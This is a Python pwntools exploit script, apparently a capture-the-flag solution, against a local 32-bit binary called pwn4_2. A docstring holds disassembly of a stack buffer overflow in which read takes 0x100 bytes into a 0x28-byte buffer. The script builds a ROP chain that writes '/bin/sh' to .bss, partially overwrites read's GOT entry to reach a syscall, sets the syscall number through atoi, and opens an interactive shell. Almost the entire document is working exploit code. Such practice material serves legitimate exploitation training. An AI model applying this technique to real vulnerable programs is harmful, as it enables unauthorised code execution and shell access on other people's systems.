from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']
'''
.text:0804843B fun             proc near               ; CODE XREF: main+11p
.text:0804843B
.text:0804843B buf             = byte ptr -28h
.text:0804843B
.text:0804843B                 push    ebp
.text:0804843C                 mov     ebp, esp
.text:0804843E                 sub     esp, 28h
.text:08048441                 sub     esp, 4
.text:08048444                 push    100h            ; nbytes
.text:08048449                 lea     eax, [ebp+buf]
.text:0804844C                 push    eax             ; buf
.text:0804844D                 push    0               ; fd
.text:0804844F                 call    _read
.text:08048454                 add     esp, 10h
.text:08048457                 sub     esp, 0Ch
.text:0804845A                 lea     eax, [ebp+buf]
.text:0804845D                 push    eax             ; nptr
.text:0804845E                 call    _atoi
.text:08048463                 add     esp, 10h
.text:08048466                 nop
.text:08048467                 leave
.text:08048468                 retn
.text:08048468 fun             endp

int fun()
{
  char buf; // [sp+0h] [bp-28h]@1

  read(0, &buf, 0x100u);
  return atoi(&buf);
}

overflow rop
>>hijack read->syscall
>>atoi -> read 0x77

'''

cn = process('./pwn4_2')
bin = ELF('./pwn4_2')

def z():
	return 0
	return raw_input()

p1ret = 0x080482e9
p3ret = 0x080484e9
p_ebx_ret = p1ret
pay = 'a'*0x28 + 'bbbb' 
pay += p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(bin.bss()) + p32(0x10)
pay += p32(bin.plt['read']) + p32(p3ret) + p32(0) + p32(bin.got['read']) + p32(1)
pay += p32(bin.plt['atoi']) + p32(p1ret) + p32(bin.bss() + 8)
pay += p32(p_ebx_ret) + p32(bin.bss())
pay += p32(bin.plt['read'])

z()
cn.send(pay)
z()
cn.send('/bin/sh\x0011')
z()
cn.send('\xdc')
z()

cn.interactive()

